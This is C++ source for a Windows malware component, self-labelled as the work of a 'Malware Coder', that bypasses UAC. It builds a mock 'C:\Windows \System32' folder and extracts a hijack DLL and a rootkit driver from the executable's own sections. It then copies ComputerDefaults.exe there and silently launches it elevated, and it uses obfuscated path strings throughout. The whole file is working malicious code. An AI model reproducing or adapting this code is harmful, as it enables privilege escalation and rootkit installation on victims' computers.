/*
##################################################
#                                                #
#         Malware Coder: Elliot Alderson         #
#                                                #
#   Github: https://github.com/ElliotAlderson51  #
#                                                #
##################################################
*/

#include "Bypass_UAC.h"

PVOID GetImageBase() // Get Image Base
{
	PDWORD virtual_address = PDWORD(&GetImageBase);
	PDWORD image_base = NULL;

	__asm
	{
		mov eax, virtual_address
		and eax, 0xFFFF0000
		IterateImage:
		cmp WORD PTR[eax], 0x5A4D
			je EndIteration
			sub eax, 0x00010000
			jmp IterateImage
			EndIteration :
		mov[image_base], eax
	}
	return image_base;
}

BOOL BypassUAC::IsProcessElevated() 
{
	BOOL fIsElevated = FALSE;
	HANDLE hToken = NULL;
	TOKEN_ELEVATION elevation;
	DWORD dwSize;

	if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
	{
		if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize))
		{
			fIsElevated = elevation.TokenIsElevated;
		}
	}

	if (hToken)
	{
		CloseHandle(hToken);
		hToken = NULL;
	}

	return fIsElevated;
}

// Extract DLL file from the last section
BOOL BypassUAC::ExtractFileFromSection(PBYTE module_base, const std::string& save_path, const std::string& save_name, const int index_from_the_end)
{
	DWORD module_size = NULL;
	PIMAGE_DOS_HEADER image_dos_header = (PIMAGE_DOS_HEADER)(module_base);
	if (image_dos_header->e_magic == IMAGE_DOS_SIGNATURE)
	{
		PIMAGE_NT_HEADERS image_nt_headers = (PIMAGE_NT_HEADERS)(module_base + image_dos_header->e_lfanew);
		if (image_nt_headers->Signature == IMAGE_NT_SIGNATURE)
		{
			PIMAGE_SECTION_HEADER first_section = (PIMAGE_SECTION_HEADER)(IMAGE_FIRST_SECTION(image_nt_headers)); // First Section
			PIMAGE_SECTION_HEADER dll_section = (PIMAGE_SECTION_HEADER)(first_section + image_nt_headers->FileHeader.NumberOfSections - index_from_the_end); // Last Section

			if (dll_section != ERROR)
			{
				module_size = dll_section->Misc.VirtualSize;
				PBYTE dll_memory = RtlOffsetToPointer(module_base, dll_section->VirtualAddress);

				// move the payload onto save_path
				DWORD bytes_written = NULL;

				if (dirExists(save_path))
				{
					HANDLE new_file = CreateFileA((save_path + "\\" + save_name).c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
					if (new_file != INVALID_HANDLE_VALUE)
					{
						WriteFile(new_file, dll_memory, module_size, &bytes_written, NULL);
					}
					CloseHandle(new_file);
				}
				// LocalFree(dll_memory);
				return TRUE;
			}
		}
	}
	return FALSE;
}

BOOL BypassUAC::UAC()
{
	this->real_ComputerDefaults_path = Tools::decode("\\C32emstSys\\owndWi:\\eCexs.ltauefrDtepuom"); // The real ComputerDefaults.exe path
	this->inMockFolder_ComputerDefaults_path = Tools::MOCK_FOLDER + Tools::decode("DeerutmpCoe\\exs.ltauf"); // A path for copy ComputerDefaults in the mock folder
	this->secur32_Path = Tools::MOCK_FOLDER + Tools::decode("r3cuSel\\dl2."); // The dll will be extracted from the malware section into this path

	if (!this->IsProcessElevated())
	{
		BOOL success = CreateDirectoryA(Tools::decode("ndWi:\\\\Cs ow").c_str(), NULL); // Create part 1 of the mock folder "C:\Windows \"
		if (success || GetLastError() == ERROR_ALREADY_EXISTS)
		{
			success = CreateDirectoryA(Tools::MOCK_FOLDER.c_str(), NULL); // Create part 2 of the mock folder "C:\Windows \System32\"
			if (success || GetLastError() == ERROR_ALREADY_EXISTS)
			{
				PBYTE module_base = PBYTE(GetImageBase());
				if (module_base != ERROR)
				{
					if (Tools::isSystem32Bit()) // Check if the system is 32bit - The Rootkit will work only on 32bit system
						ExtractFileFromSection(module_base, Tools::MOCK_FOLDER, Tools::ROOTKIT_SYS_FILE_NAME + ".sys", ROOTKIT_SECTION_INDEX); // Extract .sys file (Driver - Rootkit)

					if (ExtractFileFromSection(module_base, Tools::MOCK_FOLDER, BYPASS_UAC_DLL_NAME + ".dll", DLL_SECTION_INDEX)) // Extract DLL ("C:\Windows \System32\Secur32.dll")
					{
						if (FileExists(this->secur32_Path))
						{
							if (FileExists(this->real_ComputerDefaults_path))
							{
								if (CopyFileA(this->real_ComputerDefaults_path.c_str(), this->inMockFolder_ComputerDefaults_path.c_str(), FALSE)) // Copy computerdefauls.exe to Windows System32 Mock Folder.
								{
									SHELLEXECUTEINFOA shExInfo = { 0 };
									shExInfo.cbSize = sizeof(shExInfo);
									shExInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
									shExInfo.hwnd = 0;
									shExInfo.lpVerb = "runas";                // Operation to perform
									shExInfo.lpFile = this->inMockFolder_ComputerDefaults_path.c_str();       // Application to start    
									shExInfo.lpParameters = "";                  // Additional parameters
									shExInfo.lpDirectory = 0;
									shExInfo.nShow = SW_HIDE;
									shExInfo.hInstApp = 0;

									if (ShellExecuteExA(&shExInfo))
									{
										if (shExInfo.hProcess == INVALID_HANDLE_VALUE)
											return FALSE;

										return TRUE;
									}
								}
								else
									DeleteFileA(secur32_Path.c_str());
							}
						}
					}
				}
			}
		}
	}
	else
		return TRUE;

#ifndef LOG_OFF
	std::cout << "UAC: Failed, error code #" << GetLastError() << "\n\n";
#endif // !LOG_OFF

	return FALSE;
}